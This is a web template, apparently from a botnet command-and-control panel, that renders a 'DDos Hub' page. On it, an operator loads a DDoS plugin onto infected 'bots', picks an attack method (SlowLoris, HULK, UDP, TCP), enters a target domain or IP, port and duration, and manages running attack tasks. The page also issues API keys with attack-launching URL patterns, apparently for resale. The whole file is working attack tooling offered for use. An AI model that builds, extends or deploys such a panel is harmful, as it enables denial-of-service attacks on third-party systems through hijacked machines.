{include file="header.tpl"}
{include file="nav.tpl"}


<script>

    //  $('.bot_table').DataTable();

    function openDDosInfo(){

        $.get( "/ddosinfo", function( data ) {
            $("#ddosInfos").modal( { show: true } );
            $( "#ddosInformations" ).html( data );

        });
    }
</script>
<!-- The Modal -->
<div class="modal" id="ddosInfos">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">

            <!-- Modal Header -->
            <div class="modal-header">
                <h4 class="modal-title">Bot Info</h4>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <!-- Modal body -->
            <div id="ddosInformations" class="modal-body">

            </div>

            <!-- Modal footer -->
            <div class="modal-footer">
                <button type="button" class="btn btn-dark" data-dismiss="modal">Close</button>
            </div>

        </div>
    </div>
</div>



<!-- Modal -->
<div id="createApi" class="modal fade" role="dialog">
    <div class="modal-dialog">

        <!-- Modal content-->
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>
            <div class="modal-body">
              <form method="post">

                  <div class="form-group">
                      <label class="control-label col-sm-12" for="pwd">Max Bots per Task:</label>
                      <div class="col-sm-12">
                          <input type="number" class="form-control" id="pwd" placeholder="Enter an max amount of bots for each task" name="maxbots" required>
                      </div>
                  </div>

                  <div class="form-group">
                      <label class="control-label col-sm-12" for="pwd">Max Time:</label>
                      <div class="col-sm-12">
                          <input type="number" class="form-control" id="pwd" placeholder="Enter a time limit" name="maxtime" required>
                      </div>
                  </div>

                  <div class="form-group">
                      <label class="control-label col-sm-12" for="pwd">Max Tasks:</label>
                      <div class="col-sm-12">
                          <input type="number" class="form-control" id="pwd" placeholder="Enter how many tasks can run on same time" name="maxtasks" required>
                      </div>
                  </div>

                  <div class="form-group">
                      <div class="col-sm-offset-12 col-sm-12">
                          <div class="checkbox">
                              <label><input type="checkbox" name="active" checked> Active</label>
                          </div>
                      </div>
                  </div>

                  <div class="form-group">
                      <div class="col-sm-offset-12 col-sm-12">
                          <button type="submit" class="btn btn-success">Create</button>
                      </div>
                  </div>
              </form>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-dark" data-dismiss="modal">Close</button>
            </div>
        </div>

    </div>
</div>



<div class="page-header">
    <div class="container-fluid">
        <h2 class="h5 no-margin-bottom"> DDos Hub</h2>
    </div>
</div>
<div class="container">

    <div class="row">
        <div class="col-md-12">
            <ul class="nav nav-tabs">
                <li class="active"><a data-toggle="tab" href="#home">Config</a></li>
                <li><a data-toggle="tab" href="#menu1">DDOS-HUB</a></li>

            </ul>

            <div class="tab-content">
                <div id="home" class="tab-pane  active">
                    <h3>Configuration</h3>


                    <button type="button" class="btn btn-info btn-lg" data-toggle="modal" data-target="#createApi">Create new API</button>
                    <table class="table">
                        <tr>
                            <th colspan="2">Api</th>
                        </tr>
                        {foreach from=$allApis item=api}
                            <tr>
                                <td>{$api.apikey}</td>
                                <td>
                                    /ddosapi/v1?apikey={$api.apikey}&handle=attack&maxtime=10&port=10&method=tcp&targetip=10.0.0.9<br>
                                    /ddosapi/v1?apikey={$api.apikey}&handle=status&id=taskid<br>
                                    /ddosapi/v1?apikey={$api.apikey}&handle=startstop&id=taskid<br>
                                    /ddosapi/v1?apikey={$api.apikey}&handle=apiinfo<br>
                                </td>
                            </tr>
                        {/foreach}
                    </table>




                </div>
                <div id="menu1" class="tab-pane fade">
                    <div class="row">

                        <div class="col-md-6">
                            {if $bots_count == 0}
                                <p>You have no Active DDos Bots running please load the DDos plugin on a Amount of bots to begin a
                                    Task</p>
                                <form method="POST">
                                    <div class="form-group">
                                        <label for="usr">Load Bots for DDOS:</label>
                                        <input type="number" name="load-ddosBots" value="10" class="form-control">
                                    </div>
                                    <input type="submit" value="Start" class="btn btn-danger">
                                </form>
                            {else}
                                <h4> Currently are <a href="javascript:void(0)" onclick="openDDosInfo()">{$bots_count}</a> Bots Loaded for DDos </h4>
                                todo add function on more bots (function)
                                <form method="post">
                                    <div class="form-group">
                                        <label for="sel1">Select Method:</label>
                                        <select name="method" class="form-control" id="sel1">
                                            <option value="slow">SlowLoris</option>
                                            <option value="hulk">HULK</option>
                                            <option value="udp">UDP</option>
                                            <option value="tcp">TCP</option>
                                        </select>
                                    </div>

                                    <div class="form-group">
                                        <label for="usr">Domain/Ip:</label>
                                        <input type="text" name="targetip" class="form-control" required>
                                    </div>

                                    <div class="form-group">
                                        <label for="usr">Port:</label>
                                        <input type="text" name="targetport" class="form-control">
                                    </div>

                                    <div class="form-group">
                                        <label for="usr">Max-Time:</label>
                                        <input type="text" name="maxtime" class="form-control" required>
                                    </div>

                                    <input type="submit" value="Start" class="btn btn-danger">
                                </form>
                            {/if}

                            <hr>

                        </div>
                        <div class="col-md-6">
                            <table class="table">

                                <tr>
                                    <th>ID</th>
                                    <th>Target</th>
                                    <th>Method</th>
                                    <th>Working on</th>
                                    <th>Status</th>
                                </tr>





                                {foreach from=$tasks item=task}
                                    <tr>
                                        <td>{$task.id}</td>
                                        <td>{$task.targetip}</td>
                                        <td>{$task.method}</td>
                                        <td>{if $task.status} {$task.workingon}  {/if}</td>
                                        <td class="buttons">
                                            <form method="post"  >
                                                <input name="changeTask" value="{$task.id}" hidden>
                                                {if $task.status}
                                                    {if $task.status == "none"}
                                                        <img width="22" onclick="$(this).closest('form').submit();"   src="{$includeDir}assets/img/img/play-button.svg" title="Currenlty Paused">
                                                        <input type="text" value="Start" hidden>
                                                    {else}
                                                        <img width="25" onclick="$(this).closest('form').submit();"   src="{$includeDir}assets/img/img/round-pause-button.svg" title="Active">
                                                        <input type="text" value="Stop" hidden>
                                                    {/if}
                                                {/if}
                                            </form>
                                            <form method="post" onSubmit="if(!confirm('Sure?')){ return false; }">
                                                <input name="delete" value="{$task.id}" hidden>
                                                <img width="22" onclick="$(this).closest('form').submit();" src="{$includeDir}assets/img/img/delete.svg" title="Delete">
                                            </form>
                                        </td>
                                    </tr>
                                {/foreach}
                            </table>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>




</div>


{include file="footer.tpl"}

<script>
    $('a[data-toggle="tab"]').on('shown.bs.tab', function (e) {
        console.log("tab shown...");
        localStorage.setItem('activeHubTab', $(e.target).attr('href'));
    });

    var activeTab = localStorage.getItem('activeHubTab');
    if(activeTab){
        $('.nav-tabs a[href="' + activeTab + '"]').tab('show');
    }
</script>